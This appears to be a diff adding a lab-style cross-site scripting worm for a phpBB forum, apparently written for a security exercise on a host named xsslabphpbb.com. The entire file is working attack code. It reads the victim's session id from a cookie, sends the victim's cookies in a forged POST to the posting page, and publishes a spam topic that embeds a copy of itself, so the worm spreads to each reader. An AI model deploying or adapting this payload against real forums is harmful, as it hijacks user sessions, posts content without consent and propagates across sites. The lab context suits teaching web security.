@@ -1,0 +1,28 @@
+<script type="text/javascript" id="xss">
+function getCookie(key){
+	var cookieArray = document.cookie.split(';');
+	var i, x, y;
+	for(i = 0;i < cookieArray.length; i++){
+		x = cookieArray[i].substr(0, cookieArray[i].indexOf('='));
+		y = cookieArray[i].substr(cookieArray[i].indexOf('=') + 1);
+		if(x == key){
+			return y;
+		}
+	}
+}
+
+var Ajax = new XMLHttpRequest();
+
+Ajax.open("POST", "http://www.xsslabphpbb.com/posting.php", true);
+Ajax.setRequestHeader("Host", "www.xsslabphpbb.com");
+Ajax.setRequestHeader("Keep-Alive", "300");
+Ajax.setRequestHeader("Connection", "keep-alive");
+Ajax.setRequestHeader("Cookie", document.cookie);
+Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+var begin = '<script type="text/javascript" id="xss">';
+var end = '</script>';
+
+var content = 'subject=I+am+a+spammer&addbbcode18=%23444444&addbbcode20=0&helpbox=Ordered+list%3A+%5Blist%3D%5Dtext%5B%2Flist%5D++%28alt%2Bo%29&message=Yay+I+spammed' + encodeURIComponent(begin +  document.getElementById('xss').innerHTML + end) + '&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid='+getCookie(' phpbb2mysql_sid')+'&f=1&post=Submit';
+ 
+Ajax.send(content);
+</script>
